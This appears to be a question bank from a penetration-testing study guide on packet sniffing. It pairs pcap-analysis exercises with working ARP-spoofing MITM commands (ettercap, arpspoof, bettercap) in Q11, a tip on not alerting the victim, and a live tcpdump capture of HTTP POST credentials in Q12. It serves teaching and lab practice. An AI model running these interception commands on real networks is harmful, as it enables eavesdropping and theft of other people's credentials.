# Question Bank — Sniffing (12 questions)

> Pcap analysis and MITM questions. Steps link into per-tool docs — click any command to read what it does.

**Legend:** 🟢 easy · 🟡 medium · 🔴 hard

---

### Q1 🟢 — Open `capture.pcap` and identify the top protocol by packet count

**Category:** Pcap triage | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. `wireshark capture.pcap &` ← [why wireshark](../../tools/wireshark.md#usage)
2. `Statistics` → `Protocol Hierarchy`.

**Answer format:** protocol name (e.g. `TCP`, `HTTP`, `DNS`)

**Gotcha:** "top by packet count" ≠ "top by byte count" — check which the Q asks for.

---

### Q2 🟢 — Find HTTP credentials submitted in a POST request in `capture.pcap`

**Category:** Credential recovery | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Open `capture.pcap` in [wireshark](../../tools/wireshark.md#display-filters).
2. Filter: `http.request.method == POST`
3. Right-click a matching packet → `Follow` → `HTTP Stream`.
4. Read the form body (`username=...&password=...`).

**Answer format:** `username:password`

**Gotcha:** credentials may be URL-encoded — decode `%40` → `@`, `%21` → `!`.

---

### Q3 🟢 — Find the FTP password sent in `capture.pcap`

**Category:** Credential recovery | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Filter: `ftp.request.command == PASS` ← [why](../../tools/wireshark.md#display-filters)
2. Read the `Request arg:` field in packet details.
3. USER is on the preceding packet (`ftp.request.command == USER`).

**Answer format:** `user:password`

**Gotcha:** FTP is plaintext — if you see FTPS (`ftp.request.command` returns nothing on port 990), it's TLS and unrecoverable.

---

### Q4 🟢 — How many DNS queries were made for `example.com` in `capture.pcap`?

**Category:** DNS analysis | **Tools:** [wireshark](../../tools/wireshark.md), [tcpdump](../../tools/tcpdump.md)

**Steps:**
1. Wireshark filter: `dns.qry.name == example.com`
2. Bottom status bar → "Displayed: N".
3. CLI alternative: `tcpdump -r capture.pcap -nn 'port 53' | grep -c "example.com"` ← [why tcpdump](../../tools/tcpdump.md#usage)

**Answer format:** integer

---

### Q5 🟡 — Follow the TCP stream to port 80 on 10.10.10.50 and extract the requested URL

**Category:** Stream reconstruction | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Filter: `ip.dst == 10.10.10.50 && tcp.dstport == 80`
2. Right-click → `Follow` → `TCP Stream`.
3. Read the `GET /... HTTP/1.1` line and the `Host:` header.

**Answer format:** full URL (e.g. `http://victim.local/admin/login.php`)

---

### Q6 🟡 — Count the number of packets from 10.10.10.5 to 10.10.10.20 in `capture.pcap`

**Category:** Conversation stats | **Tools:** [wireshark](../../tools/wireshark.md), [tcpdump](../../tools/tcpdump.md)

**Steps:**
1. Wireshark: `Statistics` → `Conversations` → `IPv4` tab.
2. Or filter: `ip.src == 10.10.10.5 && ip.dst == 10.10.10.20` and read the display count.
3. CLI: `tcpdump -r capture.pcap -nn 'src 10.10.10.5 and dst 10.10.10.20' | wc -l`

**Answer format:** integer

---

### Q7 🟡 — Export all HTTP objects (files) from `capture.pcap`

**Category:** Object extraction | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. In [wireshark](../../tools/wireshark.md#usage): `File` → `Export Objects` → `HTTP...`
2. Click `Save All` → pick a folder.
3. Inspect the saved files (often images, html, exe droppers).

**Answer format:** filename of the object the Q asks for (e.g. `invoice.exe`)

**Gotcha:** only works for unencrypted HTTP. For HTTPS you need the TLS key log file loaded under `Preferences → Protocols → TLS`.

---

### Q8 🟡 — Identify the User-Agent of the client in `capture.pcap`

**Category:** Client fingerprinting | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Filter: `http.user_agent`
2. Click any matching packet → expand `Hypertext Transfer Protocol` → `User-Agent`.
3. Or: `Statistics` → `HTTP` → `Requests` for a summary.

**Answer format:** full User-Agent string

---

### Q9 🟡 — Find the name of the SMB file shared in `capture.pcap`

**Category:** SMB analysis | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Filter: `smb2.filename` or `smb.file`
2. Read the filename field in packet details.
3. Or: `File` → `Export Objects` → `SMB...` for file extraction.

**Answer format:** filename (e.g. `payroll.xlsx`)

**Gotcha:** SMB1 and SMB2/3 have different filters — try both.

---

### Q10 🔴 — Identify the protocol running on non-standard port 8081 in `capture.pcap`

**Category:** Protocol ID | **Tools:** [wireshark](../../tools/wireshark.md)

**Steps:**
1. Filter: `tcp.port == 8081`
2. Right-click → `Decode As...` → try `HTTP`, then `SSL/TLS`.
3. Follow TCP stream and read the first few bytes (`GET /` = HTTP, `\x16\x03` = TLS, `SSH-2.0` = SSH).

**Answer format:** protocol name

**Gotcha:** Wireshark sometimes auto-decodes — if the protocol column already shows it, you're done.

---

### Q11 🔴 — Perform an ARP spoofing MITM between 10.10.10.5 and the gateway 10.10.10.1

**Category:** MITM | **Tools:** [ettercap](../../tools/ettercap.md), [bettercap](../../tools/bettercap.md), [arpspoof](../../tools/arpspoof.md)

**Steps:**
1. Enable IP forwarding: `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward`
2. ettercap method:
   ```bash
   sudo ettercap -T -M arp:remote /10.10.10.5// /10.10.10.1//
   ```
   ← [why ettercap](../../tools/ettercap.md#usage)
3. arpspoof method (two terminals):
   ```bash
   sudo arpspoof -i eth0 -t 10.10.10.5 10.10.10.1
   sudo arpspoof -i eth0 -t 10.10.10.1 10.10.10.5
   ```
4. bettercap method:
   ```bash
   sudo bettercap -iface eth0 -eval "set arp.spoof.targets 10.10.10.5; arp.spoof on; net.sniff on"
   ```
5. Verify on victim: `arp -a` should show the gateway's MAC equal to your attacker MAC.

**Answer format:** captured cred or pcap filename (whatever the Q asks)

**Gotcha:** forget `ip_forward=1` and the victim loses all connectivity → they'll notice immediately.

---

### Q12 🔴 — Capture live traffic on `eth0` filtering only for HTTP POST and save to pcap

**Category:** Live capture | **Tools:** [tcpdump](../../tools/tcpdump.md)

**Steps:**
1. `sudo tcpdump -i eth0 -s 0 -w post.pcap 'tcp port 80 and (tcp[((tcp[12] & 0xf0) >> 2):4] = 0x504f5354)'` ← [why BPF](../../tools/tcpdump.md#bpf-filters)
2. `0x504f5354` = ASCII `POST`.
3. Open `post.pcap` in [wireshark](../../tools/wireshark.md) and pull creds.

**Answer format:** `post.pcap` size or first captured credential.

**Gotcha:** `-s 0` is essential — default snaplen truncates packets and breaks reassembly.

---

## 📌 Quick links

- [wireshark](../../tools/wireshark.md) · [tcpdump](../../tools/tcpdump.md)
- [ettercap](../../tools/ettercap.md) · [bettercap](../../tools/bettercap.md) · [arpspoof](../../tools/arpspoof.md)
- [Sniffing / MITM playbook](../../playbooks/sniffing-playbook.md)
- [07-sniffing README](../../07-sniffing/README.md)
